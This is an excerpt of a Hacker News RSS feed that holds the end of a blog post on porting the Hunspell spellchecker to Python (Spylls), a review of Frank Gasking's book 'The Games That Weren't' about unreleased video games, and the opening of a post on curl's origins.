<p>The dictionaries looked like easy to reuse text files with some (“insignificant” as it seemed) metadata, and the whole “use Hunspell dictionaries from pure Ruby spellchecker” project <em>still</em> felt like a “weekend-long” one, for the first few weekends. Only gradually the underwater complexity of the multilanguage word-by-word spellchecking uncovered. Eventually, I was distracted from the project and abandoned it, but I still had the fascination with the seemingly-simple, actually-mind-blowingly-complicated Hunspell, the software everybody used daily and hardly ever notice.</p>

<p>The idea to dig deeper into it, to <em>understand</em> it and <em>explain</em>, grew on me and bothered me for quite some time. And what is a better way to understand something, if not to retell it in your own words? After several lazy and not very far-progressed attempts to write something Hunspell-alike (twice in Ruby, once in Rust, once in Python), eventually, in February 2020, the task I settled down to solve is: “explanatory rewrite” of the Hunspell into high-level language with a lot of comments. I achieved this goal by December 2020, with the first release of the <a href="https://github.com/zverok/spylls">Spylls</a> project: <strong>the port of Hunspell’s core algorithms into modern, well-documented, well-structured Python</strong>.</p>

<p>And now I want to share some insights of what I uncovered on the road: about spellchecking in general and Hunspell in particular.</p>

<p>In the ongoing article series, I’ll cover these topics:</p>

<ul>
  <li>What is Hunspell, why is it significant, and why try to “explain” it (current article)</li>
  <li>Base spellchecking concepts: lookup and suggest, as seen by Hunspell</li>
  <li>How lookup (checking if the word is correct) works, and why it could be much more complicated than “just look in the list of the known words”</li>
  <li>How suggest (proposed fix for the incorrect word) works, and how hard it is to estimate its quality</li>
  <li>A closer look into Hunspell’s dictionary format. It is the most widespread open dictionary format in the world, and we’ll see what linguistic and algorithmic information it <em>potentially</em> can carry, and what part of it is actually used in existing dictionaries</li>
  <li>Some details on Spylls implementation process and results</li>
  <li>Closing thoughts on the big picture of word-by-word spellchecker problem, and Hunspell’s approach to it</li>
</ul>

<h3 id="what-is-hunspell">What is Hunspell?</h3>

<blockquote>
  <p><strong>Note:</strong> The information on Hunspell’s origins and history is mostly my guesses, following partial and incomplete sources everywhere.</p>
</blockquote>

<p>Hunspell (<small><a href="https://en.wikipedia.org/wiki/Hunspell">Wikpedia article</a></small>), initially <strong>Hun</strong>garian spellchecker, emerged as an alternative for previously existing aspell/ispell/myspell somewhere in 2002 (I guess?). It was created by László Németh, in a need of supporting languages with complicated suffixing/prefixing rules and word compounding (such as Hungarian). Hunspell’s design seemingly proved itself to be flexible enough to support most of the world’s languages, and in a few years, it became the most used spellchecker in the world. You have most probably used it even if you’ve never heard the name before today: Hunspell is the default spellchecking engine in Chrome and Firefox, Libre/OpenOffice, Adobe products, and macOS (not an exhaustive list). Dictionaries in Hunspell format exist for almost all actively used languages for which the concept of word-by-word spellchecking makes sense<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

<p>Currently, Hunspell is maintained <a href="https://github.com/hunspell/hunspell">on GitHub</a> (repo has only around 1k stars, will you believe it?). It seems that maintenance is not that easy if you’ll weight the number of open issues and PRs, and the latest commits timeline: at the time of writing it (Jan 2021), the last commit to master was of May 2020, and the last release was 1.7 on Dec 2018. Hunspell’s codebase is mostly “old-school” C++. It is being slowly modernized and it has very few comments; there are thousands of two-branch <code>if</code>s to handle non-Unicode and Unicode text separately. There is also an attempt to rewrite Hunspell from scratch in a modern C++, which at some point was developed under the <code>hunspell</code> GitHub organization. Now it is independent and called <a href="https://github.com/nuspell/nuspell">nuspell</a> (and, while not yet supporting all of the Hunspell features, already “achieved” version 4.2.0).</p>

<p>Obviously, there are open-source spellcheckers other than Hunspell. GNU aspell (that at one point was superseded by Hunspell, but still holds its ground in English suggestion quality), to name one of the older ones; but also there are novel approaches, like <a href="https://github.com/wolfgarbe/SymSpell">SymSpell</a>, claiming to be “1 million times faster” or ML-based <a href="https://github.com/bakwc/JamSpell">JamSpell</a>, claiming to be much more accurate.</p>

<p>And yet, what makes Hunspell stand out is its coverage of the world’s languages. It is not ideal, but the amount of dictionaries ready to use immediately, and amount of <em>experience</em> of dealing with typical problems and corner cases, coded into the codebase, is hard to beat.</p>

<h3 id="why-rewrite-it">Why rewrite it?</h3>

<p>As I’ve already stated above, the goal of the Spylls project was to create an <em>explanatory</em> rewrite: E.g., the “retelling” of how Hunspell works in a way that is easy to follow and to play with.</p>

<p>The necessity of this approach came to me from three facts:</p>

<ol>
  <li>Hunspell is used almost everywhere and is taken for granted;</li>
  <li>It is much more complicated than one might naively expect;</li>
  <li>This complexity—and years of human work that was spent growing the project—is notoriously hard to follow through the Hunspell’s codebase and grasp in full.</li>
</ol>

<p>In other words, I wanted to <strong>make the knowledge behind Hunspell more open</strong>.</p>

<p>The way I have chosen was not, of course, the only one possible. I could’ve just read through the original code and write a series of articles (or, rather, a book?) on how it works. I could’ve thoroughly commented and republished the original source code. But I felt that <em>reimplementing</em> is the only way of understanding what’s and why’s of the algorithms (at least for somebody not being a Hunspell’s core developer); and that implementation in a high-level language will allow focusing on words and language-related algorithms, not memory management or fighting with Unicode.</p>

<blockquote>
  <p>Note that there are also a few “pragmatic” ports of Hunspell into other languages (in order to use it in environments where C++ dependency is undesireable), namely <a href="https://github.com/aarondandy/WeCantSpell.Hunspell">WeCantSpell.Hunspell</a> in C# and <a href="https://github.com/wooorm/nspell">nspell</a> in JS (very incomplete); and aforementioned <a href="https://github.com/nuspell/nuspell">nuspell</a> can also be considered a “port” (from legacy C++ to a modern one).</p>
</blockquote>

<h3 id="why-python">Why Python?</h3>

<p>My language of choice is Ruby. It was also the first language that I’ve tried to port Hunspell into. I’d be happy to proceed with Ruby if my goal has been just a “pragmatic” library. And yet, when I decided that my goal is to make the knowledge of Hunspell’s algorithms accessible to a wide audience, I understood that Ruby is not the best choice: language reputation (slightly esoteric and mostly-for-web) would make my project lest noticeable; and my preferred coding style (mix of OO and functional, with lots of small immutable domain objects and fluent chains of iterators), while allowing me to be very effective, would make the code less accessible to other languages users.</p>

<p>What I needed was a high-level language, with as low boilerplate as possible; as mainstream as possible; as easy to experiment with and prototype as possible. Without diving into too much argument here, Python and modern JavaScript seemed to be the most suitable options, and, to be honest, Python was just closer to my soul. So, here we are!</p>

<p>The code style is mostly imperative (as it corresponds to how Hunspell is structured), with large-ish, but clearly structured methods, and a small number of classes/objects (mostly they are either “whole algorithm as a class” or almost-passive “structs” – or, in Python, dataclasses). I tried to limit myself in the usage of complex Python-specific features (like functools or itertools), but have a decent use of “list comprehensions” (as they are quite readable and Pythonic) and generators (lazy lists). Overall, I wanted the code to be good Python, but not too smart. Whether I succeeded, is up to you to decide.</p>

<p>Currently, <a href="https://github.com/zverok/spylls">Spylls</a> has <strong>≈1.5k lines of library code</strong> in 14 files. It conforms (with <a href="https://spylls.readthedocs.io/en/latest/#completeness">some reservations</a>) to all Hunspell’s integrational tests. Those tests look like a set of files each, consisting of “test dictionary + what words should be considered good, what words should be considered bad, what should be suggested instead of the bad words”, and there are <strong>127 of such sets to pass</strong>. There are <strong>2 thousand comment lines</strong> in the code, explaining thoroughly every detail of the algorithm and rendered at the <a href="https://spylls.readthedocs.io/en/latest/hunspell.html">Spylls documentation site</a>; note that besides docstrings at the beginning of each class and method, there are also inline comments in code—that’s why the documentation site uses custom theme with inline “Show code” feature.</p>

<hr>

<p>With this being said, I am wrapping up the introductory post.</p>

<p><strong>In the <a href="https://zverok.github.io/blog/2021-01-09-spellchecker-2.html">next series</a>: An introduction to Hunspell’s “lookup” and “suggest” concepts; and deeper dive into the lookup.</strong></p>


  </article></div>]]>
            </description>
            <link>https://zverok.github.io/blog/2021-01-05-spellchecker-1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789099</guid>
            <pubDate>Fri, 15 Jan 2021 10:19:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Games That Weren’t]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25788647">thread link</a>) | @rbanffy
<br/>
January 15, 2021 | https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/ | <a href="https://web.archive.org/web/*/https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1547">
	
	<div>
		
<p>Towards the end of of 1985, adverts started appearing in my Computer &amp; Video Games magazines for “the first ever computer cartoon” – Scooby Doo in the Castle Mystery! And to a massive Scooby Doo fan like me, it was incredible! They were clearly Spectrum screenshots on there, but they definitely looked like nothing else, except maybe what a Spectrum port of something like Dragon’s Lair might look like… which, the following year, we’d find out was more or less the case!</p>



<figure><img data-attachment-id="1537" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2381/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg" data-orig-size="2863,3817" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610281833&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;320&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2381" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=225" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=768" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=768 768w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=1536 1536w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=113 113w, https://retroarcadia.files.wordpress.com/2021/01/img_2381.jpg?w=225 225w" sizes="(max-width: 768px) 100vw, 768px"></figure>



<p>Anyway, as 1985 became 1986, previews started appearing that hinted at an interactive story involving a spooky Scottish castle belonging to Shaggy’s aunt, presented as cartoon action sequences that you directed to solve the mystery. And yes, it really was like a laser-disc game crammed into a 48K Spectrum! As the months passed, the big double-page, full colour adverts kept coming, but no sign of any game, then in March 1986, in an Elite preview exclusive, C&amp;VG said “despite what you’ve read in other magazines, Elite still plans to release its computer cartoon adventure, Scooby Doo in the Castle Mystery for the 48K Spectrum,” but towards the end of the article also says that it won’t be in the “heavily advertised” form because there wasn’t enough memory left to make it playable! And, of course, what we eventually got at the end of 1986 was the fantastic, but utterly brutal Scooby Doo, an arcade-platformer take on Kung-Fu Master, with some of my favourite graphics ever on the Spectrum! </p>



<figure><img data-attachment-id="1538" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/scooby-doo-180901-180209/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg" data-orig-size="960,720" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="scooby doo-180901-180209" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=960" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg 960w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/scooby-doo-180901-180209.jpg?w=768 768w" sizes="(max-width: 960px) 100vw, 960px"></figure>



<p>As much as I love what we finally got, I still look at the original advert and wonder what could have been… And I would have gotten away with it too, if it weren’t for you meddling 48K of memory! If only Sir Clive had come up with 128K a bit sooner it might all be different, but that’s the tale of my very first encounter with a game that weren’t. Wasn’t!</p>



<p>Fast forward to Christmas 2021, and I received a wonderful new book called The Games That Weren’t, written by Frank Gasking and published by my favourite retro-gaming book peddlars Bitmap Books, who are responsible for all kinds of equally wonderful stuff on my bulging bookshelves, but nothing that bulges quite as much as this 644-page hardback behemoth!</p>



<figure><img data-attachment-id="1539" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2341/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg" data-orig-size="2579,3439" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936167&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;400&quot;,&quot;shutter_speed&quot;:&quot;0.025&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2341" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=225" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=768" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=768 768w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=1536 1536w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=112 112w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=225 225w" sizes="(max-width: 768px) 100vw, 768px"></figure>



<p>As someone that writes about games from time to time, I think I’m qualified to say that everything about this puts me to shame! The first thing you notice, the very first time you flick through it, is that it’s clearly an absolute labour of love, much like Frank’s website of the same name that he started way back in the nineties to document and find lost and unreleased games across many platforms. The next thing you notice is that it’s visually stunning – even more so than Scooby Doo in the Castle Mystery! And then you realise that it’s so much more than that…</p>



<figure><img data-attachment-id="1540" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2343/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg" data-orig-size="3548,2661" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936217&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.0090909090909091&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2343" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As games industry legend David Crane tells us in the foreword, this is all about games that never quite reached the game-playing public. Going all the way back to 1975 and up to 2015, the book covers 80 games that weren’t, and they weren’t for myriad reasons that all get unravelled here – flawed game design, internal politics, over-ambition, poor hardware sales, high cartridge costs or cabinet costs, failed field tests, expired licenses, not being able to fit a computer cartoon into 48K… Actually, I should say that Scooby Doo in the Castle Mystery didn’t make the cut here (which gives me hope that it still might arrive one day!), but some of the tales around these unreleased games are definitely mysteries worthy of Scooby and the gang!</p>



<figure><img data-attachment-id="1541" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2344/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg" data-orig-size="3817,2863" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936289&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.012658227848101&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2344" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Having spent some time in my stack of old game magazines just get my head around enough of the Scooby Doo story to mention it here, I can really empathise with Frank’s decades-long obsession with investigating these mysteries – that 30 minutes putting together a timeline from first advert to previews, doubts, cancellations then something else emerging in its place was really fascinating! But where I’ve just included a picture of an old copy of C&amp;VG, every game covered in The Games That Weren’t includes a load of development assets, screenshots, photos and artistic impressions – all reproduced in the very highest quality and sometimes for the first time – to illustrate the wonderfully in-depth analysis on each game.</p>



<figure><img data-attachment-id="1542" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2345/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg" data-orig-size="3746,2810" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936335&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.013698630136986&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2345" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Before we analyse that analysis, let’s quickly mention a few of those games to give us a bit of context, as well as what is probably my favourite thing about the book, which is not only discovering stuff you didn’t know existed, but discovering stuff you would have actually bought, and even seeing screenshots of it! And that’s why we’ll start with Elite on the Nintendo Game Boy, which got to prototype stage then the deal with Ocean fell through and consigned it to history; another nice feature is that for each game it tells you if it’s available to play or not… And apparently this one is, so definitely expect more from me on that in the future! We all know about Elite, but there’s an awful lot more that you probably won’t know anything about, such as Death Pit, Dick Special, Eye of the Moon, Virtua Hamster(!), Spitfire Fury  and Starring Charlie Chaplin to name but a few. There’s unreleased sequels like Heart of Yesod, Star Fox 2 and, er, Gazza 2. There’s all kinds of film licenses that (possibly thankfully) never saw the light of day like The Terminator, Lethal Weapon and Waterworld, as well as other licenses like Daffy Duck and Tony Hawk’s Shred Session. And then there’s the versions of games you probably do know but never made it, like Rescue on Fractalus! or Bubble Bobble, Ridge Racer or The Last Ninja…</p>



<figure><img data-attachment-id="1543" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2346/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg" data-orig-size="3637,2728" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936363&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;125&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2346" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As I write this, the last game I played before I went to bed last night was Arcade Archives Frogger on Nintendo Switch, so I reckon that Frogger 2: Swampy’s Revenge on Nintendo 64 is the perfect place to talk about the actual meat of the game analysis you’re getting here! It starts with a title screen summarising the reason it weren’t – cartridge costs in this case – then the year it weren’t (2000), the developer, the platform and whether or not it’s available to play. Then we get some background history – why Frogger epitomises 1980s arcades, the aim of the game, its reception and its ports. Then we get into what happened next; in the case of Frogger, it obviously never stopped being released on different platforms, but there was a Hasbro remake developed by Millenium Interactive in 1997 that leads us directly into the non-sequel. When Hasbro wanted a sequel, Millenium weren’t available to do it, so they approached Interactive Studios. We then hear from Philip Oliver, and then the project’s technical manager, Matt Cloy, who talks about the team and how they set about developing the game for the Nintendo 64. We get right into the development kits and all the juicy technical details here, right from the horse’s mouth, as well as some great detail on the process of developing then moving on from the earliest designs. </p>



<p>This turned into very much a 3D game, in stark contrast to the overhead 2D original, with complex geometries and some wild-sounding environments that weren’t too far removed from Super Mario Galaxy, years ahead of its time. But Hasbro didn’t like it! Need something more traditional, more 2D, more like Frogger. So then we hear about how it was all stripped back, the action became more immediate to the player, and a story was introduced involving Swampy the Crocodile being jealous of Frogger’s fame and fortune! At this point we start getting some really nice detail about how the game actually played as levels took shape and started to be tested and tweaked, and then there’s some substitutions made in the team to bring on some experience and make sure the game was brought home as planned. </p>



<figure><img data-attachment-id="1546" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2384/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg" data-orig-size="3884,2913" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610461038&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;200&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2384" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>And then it was all brought down with a bang! Hasbro got cold feet on increasing cartridge production costs and lead times, and the prospect of any profit was becoming risky, so at 70% complete, the Nintendo 64 version was canned. Now we jump to the PlayStation, PC, Dreamcast and Game Boy Colour versions that did eventually make it into the wild, reviewed okay, but never really had a chance to sell properly because after a year Konami said they wanted it removed from sale because the licence had expired! Now we get into the fun part of years then passing, glitchy prototypes sneaking out into the hands of collectors, and later builds appearing that featured things like placeholder sounds from other games and Pac-Man styled frogspawn collecting that would never have made the final cut. Finally, we get to what happened next, where we are now with availability of the various unfinished states online, and how the developers feel about the project in retrospect. And as we’ve already discussed, all those written words are supported by some beautiful visuals, in this case a full-page unpublished advert for the game including the Nintendo 64 logo at the top, and a selection of half-page, well-curated (and well-defined) screenshots that serve perfectly well to bring the game to life. It really is an incredibly polished package, and that’s all for just one of the eighty games!</p>



<p>Now, not every game gets the thousands of words of research and interviews that Frogger 2 gets – though an awful lot of them do – but regardless, you can see the care, attention and passion that’s gone into every single feature on every single game. And all of this this is complemented by five purpose-built “Hardware That Wasn’t” blueprint features and a load of interviews with the likes of the aforementioned David Crane, Jeff Minter, the Oliver Twins, Matthew Smith, Geoff Crammond and many other industry big-hitters, plus an honourable mentions section on loads of other games, all in chronological order, that you can find out more about digitally.</p>



<figure><img data-attachment-id="1544" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2348/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg" data-orig-size="3729,2797" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936477&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.0099009900990099&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2348" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As I flick through the book to make sure I haven’t forgotten anything, I’m so tempted just to keep going here! I happened to stop on Solar Jetman, where a wonderful …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/">https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/</a></em></p>]]>
            </description>
            <link>https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788647</guid>
            <pubDate>Fri, 15 Jan 2021 09:13:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Food on the table while giving away source code]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25788122">thread link</a>) | @nixcraft
<br/>
January 14, 2021 | https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I founded the curl project early 1998 but had already then been working on the code since <a href="https://daniel.haxx.se/blog/2021/01/03/age-is-just-a-number-or-two/" data-type="post" data-id="15434">November 1996</a>. The source code was always open, free and available to the world. The term “open source” actually wasn’t even coined until early 1998,  just weeks before curl was born.</p>



